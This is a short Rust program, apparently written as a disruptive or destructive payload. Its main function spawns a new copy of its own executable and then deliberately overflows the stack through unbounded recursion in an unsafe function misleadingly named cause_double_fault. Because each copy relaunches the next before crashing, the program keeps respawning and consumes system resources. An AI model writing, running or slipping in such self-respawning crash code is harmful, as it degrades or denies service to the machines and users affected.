use std::alloc::{alloc, Layout};
use std::env;
use std::process::Command;

fn main() {
    let _ = Command::new(env::current_exe().unwrap()).spawn();
    unsafe {
        cause_double_fault();
    }
}

unsafe fn cause_double_fault() {
    cause_double_fault(); // Recursive call to cause stack overflow
}